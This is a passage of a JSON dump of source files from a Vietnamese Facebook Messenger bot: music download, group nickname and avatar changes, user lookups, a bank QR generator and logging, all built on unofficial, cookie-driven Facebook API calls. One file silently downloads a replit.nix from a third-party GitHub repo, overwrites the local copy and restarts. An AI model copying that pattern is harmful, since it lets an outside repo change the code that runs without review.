üë§ T√™n: ${item.artist}\\nüìú Ti√™u ƒë·ªÅ: ${item.title}\\n‚è≥ Th·ªùi l∆∞·ª£ng: ${item.timestamp} gi√¢y`;\n    });\n\n    const listMessage = `üìù Danh s√°ch t√¨m ki·∫øm c·ªßa t·ª´ kh√≥a: ${query}\\n${messages.join(\"\\n\")}\\n\\nüìå Reply (ph·∫£n h·ªìi) theo STT t∆∞∆°ng ·ª©ng ƒë·ªÉ t·∫£i nh·∫°c`;\n\n    api.sendMessage(listMessage, event.threadID, (error, info) => {\n      global.client.handleReply.push({\n        type: \"choosee\",\n        name: this.config.name,\n        author: info.senderID,\n        messageID: info.messageID,\n        dataaa: dataaa,\n      });\n    });\n  } catch (error) {\n    console.error(\"‚ùé L·ªói trong qu√° tr√¨nh t√¨m ki·∫øm:\", error);\n    api.sendMessage(`‚ùé ƒê√£ x·∫£y ra l·ªói trong qu√° tr√¨nh t√¨m ki·∫øm`, threadID, messageID);\n  }\n};\n\nmodule.exports.handleReply = async function ({ event, api, handleReply, args }) {\n  const { threadID: tid, messageID: mid, body } = event;\n\n  switch (handleReply.type) {\n    case 'choosee':\n      const choose = parseInt(body);\n      api.unsendMessage(handleReply.messageID);\n\n      if (isNaN(choose)) {\n        return api.sendMessage('‚ö†Ô∏è Vui l√≤ng nh·∫≠p 1 con s·ªë', tid, mid);\n      }\n\n      if (choose > 5 || choose < 1) {\n        return api.sendMessage('‚ùé L·ª±a ch·ªçn kh√¥ng n·∫±m trong danh s√°ch', tid, mid);\n      }\n\n      const chosenItem = handleReply.dataaa[choose - 1];\n      const urlaudio = chosenItem.url;\n      const dataPromise = await scl_download(urlaudio);\nsetTimeout(async () => {\n        const bit = dataPromise.quality;\n        const audioURL = dataPromise.url;\n        const stream = (await axios.get(audioURL, { responseType: 'arraybuffer' })).data;\n        const path = __dirname + `/cache/${Date.now()}.mp3`;\n\n        fs.writeFileSync(path, Buffer.from(stream, 'binary'));\n\n        api.sendMessage({\n          body: `[ SOUNDCLOUD - MP3 ]\\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\\n[üë§] ‚Üí T√™n: ${chosenItem.artist}\\n[üìù] ‚Üí Ti√™u ƒë·ªÅ: ${chosenItem.title}\\n[‚è≥] ‚Üí Th·ªùi l∆∞·ª£ng: ${chosenItem.timestamp} gi√¢y\\n[üîà] ‚Üí L∆∞·ª£t ph√°t: ${chosenItem.views}\\n[üóìÔ∏è] ‚Üí T·∫£i t√™n: ${chosenItem.release}\\n[üì∂] ‚Üí T·ªëc ƒë·ªô bit: ${bit}\\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\\n[‚è∞] ‚Üí Time: ${moment.tz(\"Asia/Ho_Chi_Minh\").format(\"DD/MM/YYYY || HH:mm:ss\")}`,\n          attachment: fs.createReadStream(path)\n        }, tid, () => {\n          setTimeout(() => {\n            fs.unlinkSync(path);\n          }, 2 * 60 * 1000);\n        });\n      }, 5000);\n      break;\n    default:\n  }\n};","path":null,"size_bytes":5805,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/changeNickname.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeNickname(nickname, threadID, participantID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    var form = {\n      nickname: nickname,\n      participant_id: participantID,\n      thread_or_other_fbid: threadID\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/save_thread_nickname/?source=thread_settings&dpr=1\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error === 1545014) throw { error: \"Trying to change nickname of user isn't in thread\" };\n        if (resData.error === 1357031) throw { error: \"Trying to change user nickname of a thread that doesn't exist. Have at least one message in the thread before trying to change the user nickname.\" };\n\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeNickname\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1441,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getUID.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nmodule.exports = function (_defaultFuncs, api, _ctx) {\n    return function getUID(link, callback) {\n      var resolveFunc = function () { };\n      var rejectFunc = function () { };\n      var returnPromise = new Promise(function (resolve, reject) {\n        resolveFunc = resolve;\n        rejectFunc = reject;\n      });\n  \n      if (!callback) {\n        callback = function (err, uid) {\n          if (err) return rejectFunc(err);\n          resolveFunc(uid);\n        };\n      }\n      \n    try {\n        var Link = String(link);\n        var FindUID = require('../Extra/ExtraFindUID');\n        if (Link.includes('facebook.com') || Link.includes('Facebook.com') || Link.includes('fb')) {\n            var LinkSplit = Link.split('/');\n            if (LinkSplit.indexOf(\"https:\") == 0) {\n              if (!isNaN(LinkSplit[3]) && !Link.split('=')[1]  && !isNaN(Link.split('=')[1])) {\n                api.sendMessage('Sai Link, Link C·∫ßn C√≥ ƒê·ªãnh D·∫°ng Nh∆∞ Sau: facebook.com/Lazic.Kanzu',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);\n                callback(null, String(4));\n              }\n              else if (!isNaN(Link.split('=')[1]) && Link.split('=')[1]) {\n                var Format = `https://www.facebook.com/profile.php?id=${Link.split('=')[1]}`;\n                FindUID(Format,api).then(function (data) {\n                  callback(null, data);\n                });\n              } \n              else {\n                FindUID(Link,api).then(function (data) {\n                  callback(null, data);\n                });\n              }\n            }\n            else {\n                var Form = `https://www.facebook.com/${LinkSplit[1]}`;\n                FindUID(Form,api).then(function (data) {\n                    callback(null, data);\n                });\n            }\n        }\n        else {\n            callback(null, null);\n            api.sendMessage('Sai Link, Link C·∫ßn L√† Link C·ªßa Facebook',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);\n        }\n    }\n    catch (e) {\n      return callback(null, e);\n    }\n    return returnPromise;\n    };\n  };","path":null,"size_bytes":2162,"size_tokens":null},"lib/fca-auto/src/getUserInfoV3.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function getUserInfoV3(id,full, callback) {\n        if (utils.getType(full) !== \"Boolean\") {\n            throw {error: \"getUserInfoV3: full must be a boolean\"};\n        }\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n    \n        if (!callback) {\n            callback = function (err, userInfo) {\n            if (err) return rejectFunc(err);\n            resolveFunc(userInfo);\n            };\n        }\n\nvar form = {\n    \"av\": ctx.userID,\n    \"fb_api_caller_class\": \"RelayModern\",\n    \"fb_api_req_friendly_name\": \"ProfileCometTimelineFeedRefetchQuery\",\n    \"variables\": JSON.stringify({ \n        \"id\": String(id) \n    }),\n    \"doc_id\": 5092283120862795\n};\ntry {\n        defaultFuncs\n            .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then(function (resData) {\n            if (resData.error) throw resData;\n                switch (full) {\n                    case true:\n                        callback(null, resData[0].data.node.timeline_list_feed_units.edges[0].node);\n                        break;\n                    case false:\n                        callback(null, resData[0].data.node.timeline_list_feed_units.edges[0].node.comet_sections.context_layout.story.comet_sections.actor_photo.story.actors[0]);\n                        break;\n                    default: \n                throw {error: \"getUserInfoV3: full must be a boolean\"};\n                }\n            })\n            .catch(function (err) {\n                log.error(\"getUserInfo\", \"L·ªói: getUserInfo C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu !,H√£y Th·ª≠ L·∫°i !\");\n                return callback(err);\n            });\n    }\n    catch (e) {\n        return callback(null, e);\n    }\n    return returnPromise;\n    };\n};","path":null,"size_bytes":2154,"size_tokens":null},"modules/commands/bangtuanhoan.js":{"content":"const axios = require('axios');\nconst fs = require('fs');\n\nmodule.exports.config = {\n  name: \"bangtuanhoan\",\n  version: \"1.2.0\",\n  hasPermssion: 0,\n  credits: \"TatsuYTB\",\n  description: \"Th√¥ng tin nguy√™n t·ªë h√≥a h·ªçc ng·∫´u nhi√™n\",\n  commandCategory: \"Ki·∫øn Th·ª©c\",\n  cooldowns: 5\n};\n\nconst downloadImage = async (url, path) => {\n  const response = await axios({\n    url,\n    method: 'GET',\n    responseType: 'stream'\n  });\n  return new Promise((resolve, reject) => {\n    const writer = fs.createWriteStream(path);\n    response.data.pipe(writer);\n    writer.on('finish', resolve);\n    writer.on('error', reject);\n  });\n};\n\nconst translateText = async (text, targetLang = \"vi\") => {\n  const translateAPI = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(text)}`;\n  const response = await axios.get(translateAPI);\n  if (response.data && response.data[0] && response.data[0][0]) {\n    return response.data[0][0][0];\n  }\n};\n\nmodule.exports.run = async function({ api, event, messageID }) {\n  try {\n    const response = await axios.get('https://api.popcat.xyz/periodic-table/random');\n    const data = response.data;\n\n    const name = data.name;\n    const symbol = data.symbol;\n    const atomicNumber = data.atomic_number;\n    const atomicMass = data.atomic_mass;\n    const period = data.period;\n    const discoveredBy = data.discovered_by || \"Kh√¥ng r√µ\";\n    const image = data.image;\n    let phase = data.phase || \"Kh√¥ng x√°c ƒë·ªãnh\";\n    let summary = data.summary || \"Kh√¥ng c√≥ m√¥ t·∫£\";\n\n    const translatedPhase = await translateText(phase);\n    const translatedSummary = await translateText(summary);\n    const imagePath = `./tempImage_${Date.now()}.jpg`;\n    await downloadImage(image, imagePath);\n    const message = `\nùêìùê°ùê®ÃÇùêßùê† ùê≠ùê¢ùêß ùêßùê†ùêÆùê≤ùêûÃÇùêß ùê≠ùê®ÃÇÃÅ ùê°ùê®ÃÅùêö ùê°ùê®Ã£ùêú ùêßùê†ùêöÃÇÃÉùêÆ ùêßùê°ùê¢ùêûÃÇùêß\n-T√™n: ${name}\n-K√Ω hi·ªáu: ${symbol}\n-S·ªë nguy√™n t·ª≠: ${atomicNumber}\n-Kh·ªëi l∆∞·ª£ng nguy√™n t·ª≠: ${atomicMass}\n-Chu k·ª≥: ${period}\n-Tr·∫°ng th√°i: ${translatedPhase}\n-Ph√°t hi·ªán b·ªüi: ${discoveredBy}\n-M√¥ t·∫£: ${translatedSummary}\n`;\n\n    api.sendMessage(\n      {\n        body: message,\n        attachment: fs.createReadStream(imagePath)\n      },\n      event.threadID,\n      (error, info) => {\n        if (error) {} else {}\n        fs.unlink(imagePath, (err) => {});\n      }\n    );\n\n  } catch (error) {}\n};\n","path":null,"size_bytes":2476,"size_tokens":null},"modules/commands/setall.js":{"content":"module.exports.config = {\n  name: \"setall\",\n  version: \"1.0.0\",\n  hasPermssion: 1,\n  credits: \"manhIT\",\n  description: \"Set bi·ªát danh cho all tv gi·ªëng nhau\",\n  commandCategory: \"Qu·∫£n L√≠ Box\",\n  usages: \"[name]\",\n  cooldowns: 3\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n  var threadInfo = await api.getThreadInfo(event.threadID)\n  var idtv = threadInfo.participantIDs;\n  console.log(threadInfo);\n  const name = args.join(\" \");\n  function delay(ms) {\n    return new Promise(resolve => setTimeout(resolve, ms));\n  };\n\n  for (let setname of idtv) {\n    await delay(100)\n    api.changeNickname(`${name}`, event.threadID, setname);\n  }\n}\n","path":null,"size_bytes":661,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Src/Change_Environment.js":{"content":"module.exports = async function(callback) {\n    const got = require('got');\n    const log = require('npmlog');\n    const fs = require('fs');\n    const Database = require('../../Extra/Database');\n    const Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == global.Fca.Require.FastConfig.Language).Folder.Index;\n    const Check = fs.readFileSync(process.cwd() + \"/replit.nix\", { encoding: 'utf8' });\n    switch (Check.includes('pkgs.nodejs-14_x')) {\n        case true: {\n            Database(true).set(\"NeedRebuild\", false);\n            return;\n        }\n        case false: {\n            log.warn(\"[ FCA-HZI ] ‚Ä¢\",Language.EVMChange);\n            const { body } = await got('https://raw.githubusercontent.com/KanzuXHorizon/Global_Horizon/main/repl.nix');\n            fs.writeFileSync(process.cwd() + \"/replit.nix\", body, { encoding: 'utf8' });\n            log.info(\"[ FCA-HZI ] ‚Ä¢\",Language.EVMChangeSuccess);\n            await new Promise(resolve => setTimeout(resolve, 3000));\n            Database(true).set(\"NeedRebuild\", true);\n            process.exit(1);\n        }\n    }\n\n}","path":null,"size_bytes":1134,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Security/AES_256_GCM/index.js":{"content":"","path":null,"size_bytes":0,"size_tokens":null},"lib/fca-auto/src/changeAvatar.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\tfunction handleUpload(image, callback) {\n\t\tconst uploads = [];\n\n\t\tconst form = {\n\t\t\tprofile_id: ctx.i_userID || ctx.userID,\n\t\t\tphoto_source: 57,\n\t\t\tav: ctx.i_userID || ctx.userID,\n\t\t\tfile: image\n\t\t};\n\n\t\tuploads.push(\n\t\t\tdefaultFuncs\n\t\t\t\t.postFormData(\n\t\t\t\t\t\"https://www.facebook.com/profile/picture/upload/\",\n\t\t\t\t\tctx.jar,\n\t\t\t\t\tform,\n\t\t\t\t\t{}\n\t\t\t\t)\n\t\t\t\t.then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n\t\t\t\t.then(function (resData) {\n\t\t\t\t\tif (resData.error) {\n\t\t\t\t\t\tthrow resData;\n\t\t\t\t\t}\n\t\t\t\t\treturn resData;\n\t\t\t\t})\n\t\t);\n\n\t\t// resolve all promises\n\t\tPromise\n\t\t\t.all(uploads)\n\t\t\t.then(function (resData) {\n\t\t\t\tcallback(null, resData);\n\t\t\t})\n\t\t\t.catch(function (err) {\n\t\t\t\tlog.error(\"handleUpload\", err);\n\t\t\t\treturn callback(err);\n\t\t\t});\n\t}\n\n\treturn function changeAvatar(image, caption = \"\", timestamp = null, callback) {\n\t\tlet resolveFunc = function () { };\n\t\tlet rejectFunc = function () { };\n\t\tconst returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\n\t\tif (!timestamp && utils.getType(caption) === \"Number\") {\n\t\t\ttimestamp = caption;\n\t\t\tcaption = \"\";\n\t\t}\n\n\t\tif (!timestamp && !callback && (utils.getType(caption) == \"Function\" || utils.getType(caption) == \"AsyncFunction\")) {\n\t\t\tcallback = caption;\n\t\t\tcaption = \"\";\n\t\t\ttimestamp = null;\n\t\t}\n\n\t\tif (!callback) callback = function (err, data) {\n\t\t\tif (err) {\n\t\t\t\treturn rejectFunc(err);\n\t\t\t}\n\t\t\tresolveFunc(data);\n\t\t};\n\n\t\tif (!utils.isReadableStream(image))\n\t\t\treturn callback(\"Image is not a readable stream\");\n\n\t\thandleUpload(image, function (err, payload) {\n\t\t\tif (err) {\n\t\t\t\treturn callback(err);\n\t\t\t}\n\n\t\t\tconst form = {\n\t\t\t\tav: ctx.i_userID || ctx.userID,\n\t\t\t\tfb_api_req_friendly_name: \"ProfileCometProfilePictureSetMutation\",\n\t\t\t\tfb_api_caller_class: \"RelayModern\",\n\t\t\t\tdoc_id: \"5066134240065849\",\n\t\t\t\tvariables: JSON.stringify({\n\t\t\t\t\tinput: {\n\t\t\t\t\t\tcaption,\n\t\t\t\t\t\texisting_photo_id: payload[0].payload.fbid,\n\t\t\t\t\t\texpiration_time: timestamp,\n\t\t\t\t\t\tprofile_id: ctx.i_userID || ctx.userID,\n\t\t\t\t\t\tprofile_pic_method: \"EXISTING\",\n\t\t\t\t\t\tprofile_pic_source: \"TIMELINE\",\n\t\t\t\t\t\tscaled_crop_rect: {\n\t\t\t\t\t\t\theight: 1,\n\t\t\t\t\t\t\twidth: 1,\n\t\t\t\t\t\t\tx: 0,\n\t\t\t\t\t\t\ty: 0\n\t\t\t\t\t\t},\n\t\t\t\t\t\tskip_cropping: true,\n\t\t\t\t\t\tactor_id: ctx.i_userID || ctx.userID,\n\t\t\t\t\t\tclient_mutation_id: Math.round(Math.random() * 19).toString()\n\t\t\t\t\t},\n\t\t\t\t\tisPage: false,\n\t\t\t\t\tisProfile: true,\n\t\t\t\t\tscale: 3\n\t\t\t\t})\n\t\t\t};\n\n\t\t\tdefaultFuncs\n\t\t\t\t.post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n\t\t\t\t.then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n\t\t\t\t.then(function (resData) {\n\t\t\t\t\tif (resData.errors) {\n\t\t\t\t\t\tthrow resData;\n\t\t\t\t\t}\n\t\t\t\t\treturn callback(null, resData[0].data.profile_picture_set);\n\t\t\t\t})\n\t\t\t\t.catch(function (err) {\n\t\t\t\t\tlog.error(\"changeAvatar\", err);\n\t\t\t\t\treturn callback(err);\n\t\t\t\t});\n\t\t});\n\n\t\treturn returnPromise;\n\t};\n};\n","path":null,"size_bytes":2965,"size_tokens":null},"modules/commands/qrbank.js":{"content":"const axios = require(\"axios\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\n\nmodule.exports.config = {\n  name: \"qrbank\",\n  version: \"1.2.0\",\n  hasPermssion: 1,\n  credits: \"N.Trung\",\n  description: \"T·∫°o m√£ QR chuy·ªÉn kho·∫£n VietQR\",\n  commandCategory: \"Ti·ªán √≠ch\",\n  usages: \"qr\",\n  cooldowns: 5,\n};\n\n// Danh s√°ch ng√¢n h√†ng s·∫Øp x·∫øp theo y√™u c·∫ßu (STT)\nconst sortedBankList = [\n  { code: \"546034\", name: \"CAKE by VPBank\" },\n  { code: \"546035\", name: \"Ubank by VPBank\" },\n  { code: \"963388\", name: \"TIMO\" },\n  { code: \"970403\", name: \"Sacombank\" },\n  { code: \"970405\", name: \"Agribank\" },\n  { code: \"970407\", name: \"Techcombank\" },\n  { code: \"970415\", name: \"VietinBank\" },\n  { code: \"970416\", name: \"ACB\" },\n  { code: \"970418\", name: \"BIDV\" },\n  { code: \"970422\", name: \"MB Bank\" },\n  { code: \"970423\", name: \"TPBank\" },\n  { code: \"970426\", name: \"MSB\" },\n  { code: \"970429\", name: \"SCB\" },\n  { code: \"970431\", name: \"Eximbank\" },\n  { code: \"970432\", name: \"VPBank\" },\n  { code: \"970436\", name: \"Vietcombank\" },\n  { code: \"970437\", name: \"HDBank\" },\n  { code: \"970441\", name: \"VIB\" },\n  { code: \"970443\", name: \"SHB\" },\n  { code: \"970448\", name: \"OCB\" },\n  { code: \"970454\", name: \"VietCapitalBank\" },\n  { code: \"971005\", name: \"ViettelMoney\" },\n  { code: \"971011\", name: \"VNPTMoney\" },\n];\n\nmodule.exports.run = async function ({ api, event }) {\n  const { threadID, messageID, senderID } = event;\n  return api.sendMessage(\"üî¢ Nh·∫≠p s·ªë t√†i kho·∫£n ng√¢n h√†ng:\", threadID, (err, info) => {\n    global.client.handleReply.push({\n      name: module.exports.config.name,\n      step: 1,\n      author: senderID,\n      messageID: info.messageID,\n      data: {}\n    });\n  });\n};\n\nmodule.exports.handleReply = async function ({ api, event, handleReply }) {\n  const { threadID, messageID, senderID, body } = event;\n  const { step, author, data } = handleReply;\n  if (senderID !== author) return;\n\n  switch (step) {\n    case 1: {\n      data.accountNo = body.trim();\n      return api.sendMessage(\"üë§ Nh·∫≠p t√™n ch·ªß t√†i kho·∫£n:\", threadID, (err, info) => {\n        global.client.handleReply.push({\n          name: module.exports.config.name,\n          step: 2,\n          author,\n          messageID: info.messageID,\n          data\n        });\n      });\n    }\n\n    case 2: {\n      data.accountName = body.trim();\n\n      let msg = \"üè¶ Danh s√°ch ng√¢n h√†ng h·ªó tr·ª£:\\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\\n\";\n      sortedBankList.forEach((bank, i) => {\n        msg += `üî¢ ${i + 1}. ${bank.name} (${bank.code})\\n`;\n      });\n      msg += \"‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\\nüëâ Reply s·ªë th·ª© t·ª± ƒë·ªÉ ch·ªçn ng√¢n h√†ng.\";\n\n      return api.sendMessage(msg, threadID, (err, info) => {\n        global.client.handleReply.push({\n          name: module.exports.config.name,\n          step: 3,\n          author,\n          messageID: info.messageID,\n          data\n        });\n      });\n    }\n\n    case 3: {\n      const index = parseInt(body.trim()) - 1;\n      if (isNaN(index) || index < 0 || index >= sortedBankList.length)\n        return api.sendMessage(\"‚ùé S·ªë th·ª© t·ª± kh√¥ng h·ª£p l·ªá. Vui l√≤ng th·ª≠ l·∫°i.\", threadID, messageID);\n\n      const selectedBank = sortedBankList[index];\n      data.acqId = selectedBank.code;\n      data.bankFullName = selectedBank.name;\n\n      return api.sendMessage(\"üíµ Nh·∫≠p s·ªë ti·ªÅn c·∫ßn chuy·ªÉn:\", threadID, (err, info) => {\n        global.client.handleReply.push({\n          name: module.exports.config.name,\n          step: 4,\n          author,\n          messageID: info.messageID,\n          data\n        });\n      });\n    }\n\n    case 4: {\n      data.amount = body.trim();\n      return api.sendMessage(\"üìù Nh·∫≠p n·ªôi dung chuy·ªÉn kho·∫£n:\", threadID, (err, info) => {\n        global.client.handleReply.push({\n          name: module.exports.config.name,\n          step: 5,\n          author,\n          messageID: info.messageID,\n          data\n        });\n      });\n    }\n\n    case 5: {\n      data.addInfo = body.trim();\n\n      if (\n        isNaN(data.accountNo) ||\n        isNaN(data.acqId) ||\n        isNaN(data.amount)\n      ) {\n        return api.sendMessage(\"‚ùé S·ªë t√†i kho·∫£n, m√£ ng√¢n h√†ng, v√† s·ªë ti·ªÅn ph·∫£i l√† s·ªë!\", threadID, messageID);\n      }\n\n      try {\n        const res = await axios.post(\"https://api.vietqr.io/v2/generate\", {\n          accountNo: data.accountNo,\n          accountName: data.accountName,\n          acqId: data.acqId,\n          amount: parseInt(data.amount),\n          addInfo: data.addInfo,\n          template: \"compact\"\n        });\n\n        const qrData = res.data?.data?.qrDataURL;\n        if (!qrData) return api.sendMessage(\"‚ùé Kh√¥ng th·ªÉ t·∫°o QR. Th·ª≠ l·∫°i sau!\", threadID, messageID);\n\n        const qrBuffer = Buffer.from(qrData.replace(/^data:image\\/png;base64,/, \"\"), \"base64\");\n        const filePath = path.join(__dirname, \"cache\", `qr-${Date.now()}.png`);\n        fs.writeFileSync(filePath, qrBuffer);\n\n        const result = `‚úÖ M√£ QR ƒë√£ t·∫°o:\\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\\nüè¶ ${data.bankFullName} (${data.acqId})\\nüî¢ STK: ${data.accountNo}\\nüë§ Ch·ªß TK: ${data.accountName}\\nüí∞ S·ªë ti·ªÅn: ${parseInt(data.amount).toLocaleString()} VND\\nüìù N·ªôi dung: ${data.addInfo}`;\n\n        return api.sendMessage({\n          body: result,\n          attachment: fs.createReadStream(filePath)\n        }, threadID, () => fs.unlinkSync(filePath), messageID);\n\n      } catch (e) {\n        console.error(e);\n        return api.sendMessage(\"‚ùé ƒê√£ c√≥ l·ªói x·∫£y ra khi t·∫°o m√£ QR!\", threadID, messageID);\n      }\n    }\n\n    default: return;\n  }\n};","path":null,"size_bytes":5654,"size_tokens":null},"modules/events/log.js":{"content":"module.exports.config = {\n    name: \"log\",\n    eventType: [\"log:unsubscribe\", \"log:subscribe\", \"log:thread-name\"],\n    version: \"1.0.0\",\n    credits: \"Mirai Team\",\n    description: \"Ghi l·∫°i th√¥ng b√°o c√°c ho·∫°t ƒë√¥ng c·ªßa bot!\",\n    envConfig: {\n      enable: true\n    }\n  };\n  \n  module.exports.run = async function ({ api, event, Users, Threads }) {\n    const logger = require(\"../../utils/log\");\n    if (!global.configModule[this.config.name].enable) return;\n    let botID = api.getCurrentUserID();\n    var allThreadID = global.data.allThreadID;\n    for (const singleThread of allThreadID) {\n      const thread = global.data.threadData.get(singleThread) || {};\n      if (typeof thread[\"log\"] != \"undefined\" && thread[\"log\"] == false) return;\n    }\n    \n    const moment = require(\"moment-timezone\");\n    const time = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"D/MM/YYYY HH:mm:ss\");\n    //let nameThread = (await Threads.getData(event.threadID)).threadInfo.threadName || \"T√™n kh√¥ng t·ªìn t·∫°i\";\n    let nameThread = global.data.threadInfo.get(event.threadID).threadName || \"T√™n kh√¥ng t·ªìn t·∫°i\"; \n  \n    let threadInfo = await api.getThreadInfo(event.threadID);\n    nameThread =threadInfo.threadName;\n    const nameUser = global.data.userName.get(event.author) || await Users.getNameUser(event.author);\n  \n    console.log(nameThread)\n  \n    var formReport = \"„Äé üå∏ „Äè Th√¥ng b√°o Th√™m/Kick „Äé üå∏ „Äè\" +\n      \"\\n\\n„Äé üå∏ „Äè Box name: \" + nameThread +\n      \"\\n„Äé üå∏ „Äè Thread ID: \" + event.threadID +\n      \"\\n„Äé üå∏ „Äè] H√†nh ƒë·ªông: {task}\" +\n      \"\\n„Äé üå∏ „Äè T√™n ng∆∞·ªùi d√πng: \" + nameUser +\n      \"\\n„Äé üå∏ „Äè UserID: \" + event.author +\n      \"\\n\\n„Äé üå∏ „Äè Time: \" + time + \"\",\n      task = \"\";\n    switch (event.logMessageType) {\n      case \"log:thread-name\": {\n          newName = event.logMessageData.name || \"T√™n kh√¥ng t·ªìn t·∫°i\";\n          //task = \"Ng∆∞·ªùi d√πng thay ƒë·ªïi t√™n nh√≥m th√†nh \" + newName + \"\";\n          await Threads.setData(event.threadID, {name: newName});\n          break;\n      }\n      case \"log:subscribe\": {\n        if (event.logMessageData.addedParticipants.some(i => i.userFbId == botID)) task = \"„Äé üå∏ „Äè Ng∆∞·ªùi d√πng ƒë√£ th√™m bot v√†o m·ªôt nh√≥m m·ªõi\";\n        break;\n      }\n      case \"log:unsubscribe\": {\n        if (event.logMessageData.leftParticipantFbId == botID) {\n          if(event.senderID == botID) return;\n          const data = (await Threads.getData(event.threadID)).data || {};\n          data.banned = true;\n          var reason = \"[„Äé üå∏ „Äè KiÃÅch bot t∆∞Ã£ do, kh√¥ng xin pheÃÅp\";\n          data.reason = reason || null;\n          data.dateAdded = time;\n          await Threads.setData(event.threadID, { data });\n          global.data.threadBanned.set(event.threadID, { reason: data.reason, dateAdded: data.dateAdded });\n  \n          task = \"„Äé üå∏ „Äè Ng∆∞·ªùi d√πng ƒë√£ kick bot ra kh·ªèi nh√≥m\"\n        }\n        break;\n      }\n      default:\n        break;\n    }\n  \n    if (task.length == 0) return;\n  \n    formReport = formReport\n      .replace(/\\{task}/g, task);\n  \n    return api.sendMessage(formReport, global.config.ADMINBOT[0], (error, info) => {\n      if (error) return logger(formReport, \"Logging Event\");\n    });\n  }","path":null,"size_bytes":3252,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Src/Check_Update.js":{"content":"// module.exports = async function(Stable_Version) {\n//     const got = require('got');\n//     const log = require('npmlog');\n//     const fs = require('fs');\n//     const Database = require('../Database');\n//     const { execSync } = require('child_process');\n//     //make request https://raw.githubusercontent.com/KanzuXHorizon/Fca-Horizon-Remastered/main/package.json\n//     const { body } = await got('https://raw.githubusercontent.com/KanzuXHorizon/Fca-Horizon-Remastered/main/package.json');\n//     const json = JSON.parse(body);\n//     const LocalVersion = require('../../package.json').version;\n//         if (Number(LocalVersion.replace(/\\./g,\"\")) < Number(json.version.replace(/\\./g,\"\")) && global.Fca.Require.FastConfig.Stable_Version.Accept == false || Stable_Version && Number(LocalVersion.replace(/\\./g,\"\")) != Number(Stable_Version.replace(/\\./g,\"\"))) {\n//             var Version = Stable_Version != undefined ? Stable_Version : json.version;\n//             log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"New Version, Ready to Update: \" + LocalVersion + \" -> \" + Version);    \n//             await new Promise(resolve => setTimeout(resolve, 3000));\n//             try {\n//                 execSync(`npm install fca-horizon-remastered@${Version}`, { stdio: 'inherit' });\n//                 log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                 await new Promise(resolve => setTimeout(resolve, 3000));\n//                 Database().set(\"Instant_Update\", Date.now());\n//                 await new Promise(resolve => setTimeout(resolve, 3000));\n//                 process.exit(1);\n//             }\n//             catch (err) {\n//                 try {\n//                     console.log(err);  \n//                     log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Trying Another Method 1...\");\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     execSync(`npm install fca-horizon-remastered@${Version} --force`, { stdio: 'inherit' });\n//                     log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                     await new Promise(resolve => setTimeout(resolve, 